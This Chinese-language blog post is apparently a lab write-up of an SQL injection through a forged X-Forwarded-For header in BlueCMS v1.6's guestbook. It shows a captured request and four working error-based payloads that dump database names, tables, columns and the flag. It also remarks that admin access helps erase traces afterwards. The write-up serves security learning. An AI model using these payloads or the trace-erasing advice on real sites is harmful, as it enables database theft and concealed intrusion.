---
title: "BlueCMS v1.6 存在 XFF 伪造漏洞"
date: 2024-02-15
description: "留言区获取 ip 的函数存在 SQL 注入点，在 POST 请求头伪造 XFF 可以实现注入"
tags: ["SQL 注入","后端漏洞"]
featured_image: ""
# images is optional, but needed for showing Twitter Card
images: []
categories: "sec"
comment: false
draft: false
---

## 概述

这是个靶场，提示 header 注入。打开网页的留言区发现了留言显示 ip 地址，因此想到伪造 X-FORWARDED-FOR。最终我们在留言区将留言作为回显拿到了 flag。

## 找到注入点

打开靶场后看到如下界面。

![sqli5](/images/sqli1/sqli5-5.png)

发现可以用弱口令登录管理员后台。

![sqli5](/images/sqli1/sqli5-6.png)

如果是真实场景我们可以考虑尝试在后台挖别的漏洞，但是考虑到靶场提示 flag 用到 http-header 做 sql 注入，我们考虑先回原来的网站尝试寻找能显示 ip 的地方。

（事后发现登录管理员权限也是有意义的，主要是在拿到 flag 之后删除痕迹，逃离肇事现场。）

回到原来的页面，找到留言区，发现提交留言会显示 ip 地址。我们用 burp 抓包后在请求里面人为添加一行 xff 进行伪造。

    POST /guest_book.php HTTP/1.1
    Host: 111.9.41.91:53005
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
    X-FORWARDED-FOR: '
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 36
    Origin: http://111.9.41.91:53005
    Connection: close
    Referer: http://111.9.41.91:53005/guest_book.php
    Cookie: __tins__713776=%7B%22sid%22%3A%201708012726639%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201708014526639%7D; __51cke__=; __51laig__=1; PHPSESSID=eigkieftqj4bb7qg3frjdtav35; admin=admin; pass=21232f297a57a5a743894a0e4a801fc3; detail=1
    Upgrade-Insecure-Requests: 1

    content=test&act=send&rid=&page_id=1

我们在 xff 处分别写单引号和 0.0.0.0，看到如下响应。

![sqli5](/images/sqli1/sqli5-3.png)

![sqli5](/images/sqli1/sqli5-4.png)

如上图所示，我们输入的 0.0.0.0 成功替换了网页上的 ip 显示，而单引号引起报错，我们还看到了网站的 insert 语句。现在我们确定 xff 存在注入点。

## 构造 payload

我们利用看到的报错提示构造 payload。

    Error：Query error:
    INSERT INTO blue_guest_book (id, rid, user_id, add_time, ip, content) 
			VALUES ('', '0', '1', '1708020440', '
    1',(select schema_name from information_schema.schemata limit 0,1)),('', '0', '1', '1708020440', '0
    ', 'test')<br><br>

我们的 payload 闭合了前后的引号和括号，理论上会将信息打印在留言区。考虑到留言区没有字数限制，直接使用 group_concat 进行打印。分别构造如下 payload。

    X-FORWARDED-FOR: 1',(select group_concat(schema_name) from information_schema.schemata)),('', '0', '1', '1708020440', '0

    X-FORWARDED-FOR: 1',(select group_concat(table_name) from information_schema.tables where table_schema='flag_db')),('', '0', '1', '1708020440', '0

    X-FORWARDED-FOR: 1',(select group_concat(column_name) from information_schema.columns where table_schema='flag_db' and table_name='flag')),('', '0', '1', '1708020440', '0

    X-FORWARDED-FOR: 1',(select value from flag_db.flag)),('', '0', '1', '1708020440', '0

看到如下成功的回显。

![sqli5](/images/sqli1/sqli5-0.png)

![sqli5](/images/sqli1/sqli5-2.png)

![sqli5](/images/sqli1/sqli5-1.png)

至此得到 flag=ywaq{IuzxdoJgVd}。

## 其他

一开始用 sqlmap 跑了半天没跑出来，其实这个靶场手工比脚本好很多。一方面是因为 sqlmap 只会缘木求鱼，而我们的 payload 是利用报错信息构造的，sqlmap 没这么智能。另一方面脚本会在页面留下大量垃圾数据，如果没有管理员权限还删不掉。